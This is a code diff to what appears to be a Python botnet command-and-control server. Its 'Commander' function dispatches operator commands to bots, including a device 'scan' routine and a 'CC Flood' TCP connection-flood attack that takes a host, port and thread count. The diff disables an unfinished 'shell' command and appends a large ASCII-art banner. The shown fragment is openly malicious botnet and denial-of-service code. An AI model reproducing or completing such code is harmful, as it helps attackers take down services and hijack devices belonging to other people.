@@ -226,8 +226,8 @@ def Commander(sock):#cnc server
 				#sock.send(str(count)+"bots exec the command\r\n".encode())
 			if cmd_str == 'scan' or cmd_str == 'scan\r\n':
 				scan_device()
-			if cmd_str == 'shell' or cmd_str == 'shell\r\n':
-				shell_exec()
+			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
+				#shell_exec()
 			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
 				sock.send('\r\n#-- Commands --#\r\n'.encode())
 				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
@@ -322,3 +322,45 @@ if __name__ == '__main__':
 	while 1:
 		if shutdown:
 			sys.exit()
+'''
+mmmmmddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddddddddddmmmddddddddddddddddddddddddddddddddddddddddd
+mdmmmdddddmmmmmmmmmmmmmmmmmmmmmmmmmmmdhso+/--....``....-:/+syhddddddddddddddddddddddddddddddddddddd
+ddddddddddddmmmmmmmmmmmmmmmmmmmmdys/-.`    ``.--------..`   ``.:+shdddddddddddddddddddddddddddddddd
+dddddddddddddddddddddddddmmmdhs/.`   `-:+oyhhhddddddddhhhyo+:.`   .:sdddddddddddddddddddddddddddddd
+ddddddddddddddddddddddddddhs:.   .:+yhddddddddddddddddddddddddhyo/-``-ydddddddddddddddddddddddddddd
+ddddddddddddddddddddddddy/.  `-+yhdddddddddddddddddddddddddddddddddhyoydddddddddddddddddddddddddddd
+ddddddddddddddddddddddy:`  .+yddddddddddddddddddddddddddddddddddddddddhyyhddddddddddddddddddddddddd
+dddddddmmmmmmdddddddh/`  -ohdddddddddddddddddddddddddddddddddddddddddddhyooyddddddddddddddddddddddd
+mmmmmdddmmmmmmmmmmdo.  .odddddddddddddddddddddddddddddddddddddddddhddddddh+:-sddddddddddddddddddddd
+mmmmmmmdmmmmmmmmmd/  `+ddddddddddddddddddddddddddddddddddddddddddhshdddddddo` :hddddddddddddddddddd
+mmmmmmmmmmmmmmmmh-  -ymmmdddyyddddddddddddddddddddddddddddddddddh/ysddddddddy- .sdddddddddddddddddd
+mmmmmmmmmmmmmmmh.  /dddddddd-`yddddddddddddddddddddddddddddddddd+/yodddddddddh: `/ddddddddddddddddd
+ddddddmmmmmmmmh.  /ddddddddd- .hddddddddddddddh/-+hdddddddddddds.hooddddddddddd/  :hddddddddddddddd
+ddddddddmmmddd-  /dddddddddho :/yyhddddddddddd`   `oddddddddddh-+hsohhhhhddddddd-  -ddddddddddddddd
+ddddddddddddd+  -dddddddddddd`:s+hhhhhddddddd: .    /dddddhhhh+-yyooyyyyhhddddddy`  /dddddddddddddd
+ddddddddddddh  `hdddddddddddd+sdoyyydddddddd+ /hs.   -yhhhhhhy:yhh/oyhhyyyyhhhhdd+   yddddddddddddd
+dddddddddddd/  +dddddddddddddhhdhss+yddddddy./hhhh/   `shhhhhsyhhh:shhhhhhyhhhhddh.  -ddddddddddddd
+dddddddddddd`  hdddddddddddddhhhdhyh/ohhhhhyyhhhdddo`  `+hddhhhhhh-yhhhhhhhhhhhhddo   ydddddddddddd
+ddddddddddds  -dddddddddddddddo+ddhsy.+ddhhhdddddddds.  -sddhddhhh.yhhhhhhhhhhhhddd`  +Nmmmdddddddd
+ddddddddddd+  /ddddddddddddddd-:dddhyy/sysyddddddddddh/`oyhhdddddh shddddddddddhmNN:  :NNNNmddmmmmm
+ddddddddddd+  oddddhdddddddddd/ hdddyyh+.sdddddddddddddo`syyhddddh +hdddddddddddmNN+  :NNNNmdmNNNNN
+ddddddddddd+  +dddddddddddddddy oddddy/ -dddddddddddddddy/.hdddddh oddhyssyhddmdmmmo  /NmNNmddNNNNN
+dddddddddddo  /dddddddddddddddd`-ddddy`.yyddddddddddddddd./dddyso+ ./++sydhdmmmmmmm-  sNNNNmddNNNNN
+dddddddddddh  .dddddddddddddddd- hddh`.+/syydddddddddhys:`+//+oyhs .dddddddmNNNNNmm  `mNNNNNddmmmmm
+dddddddddddd:  sddddddddddddddd: sds`.hd:`-.oso+/:-.-:/- +yhhddddo `dddddddmNNmmNN/  +NNNmmmddNNNNm
+ddddddddddddy  .ddddddddddddddd/ +o` /+:.    `:/+syhddy /dddddhhd/  dddddmmmNmmmNy``.mmNNmmNddNNmNN
+ddddddddddddd+  /dddddddddmmmdd: `   .-:+o`   sddddddd-`ddmmmmddd/.:ddmmmmmmmNmmd.  hNNNNNmmmdmNNmN
+ddddmddddddddd:  +ddddddmmNNNmmo` .yhdddddy`  `sddddds +ddddddddmdhdddmmmmmmmmNm-  oNNNNNmmmmdmmNNN
+dmNNNNNmddddmmd-  +mmdddmmNNmmmNhshddddddmmh.  `sdddd..dmmdmmmmmmmmmmmmmmmmmmmm+` +NNNNNNmmmmdmmNmm
+dNNmmNNmmmmmNmmd:  /mmmmmNNNNNNNmddddddmmmNNd.  `odd+ smmmmNNmmmmmmNNmmNmmNNNmo: +mNNNNNNmmmmdmmNNN
+mNmNNNNmmmmmNmmmd+  :dmmmmNNNNNNmmmmmmmmNmmmmh.  `os`.dmmmNNNNmmNmNNNNNmmmmNmo:`ommmmNNNNmmmmmmNNNN
+mNNNNNNmmmmmmmmmNmy. .smmNNNNNNNmmmNNmmmNNNNmmd:   ` smmNNmmNmmmNNNNmmmNmmmdo-.yNNNNmNmNNNNNmmmNNmN
+mNNNNNNmmmNNmmmmNNNd/  :hNNNNNNNNNNNNmmNNmNNNmNm+   `mNNmmmNmNmNNNNNmmmNmmhs:/dNNNmmmmNNNNNNNmmNNmN
+NNNNNNNNNNNmNNNmNNNNNy- `+dmNNNNNNNNNNNNNmmNNNNNms`./mNNNNNNNNNNNmNmmNNmhysohmNNNmNNNNNNNNmNNmmNmmN
+NNNNNNNNNNNNmNNNNNNNNNms- ./hmNNNNNNNNNNNNNNNNNNNNhdmNNNNNNNNNNNNmmmmmhyhydmNNNNNmNNmNmNNmmmNmmNNNN
+NNNmNmNNNNNNmNNNNNNNNNNmmy:`.+ydmNNNNNNNNNmNNNNNNNNNNmmNNmmNmmNNNmdhhhhddmNNNNmmmmNNmmmNNmmmNmmNNNN
+NNNmNNNNNNNNNNNNNNNNNmNmNNmh+--/oydmNNNNNNmNNNNNNmNNNmmmNmNNmNmmddhhdmNNNNNNNNmmNNNNNNmNNmmmNmmNNNN
+NNNNNNNNNNmNNNmmNNNNmmNNNNNNNmho:::+syhmmmmmNNNNNmNNNNNNmmmmmmmmmmNNNNNNNNNNNmNNmmmNNNmmNNmmmmNNNNN
+NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdy+:/+oyyhyhdddddmmmmdmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+mNNNNNNNNNNNmNNNNNNNNNNNNNNmNNNNNNNNNmmdhdmmmmmmmmmmdyhNNNNNNmmmmNNNNNNmNNNNdmmNNmdmmNNNNNNNNNNNNNN
+'''
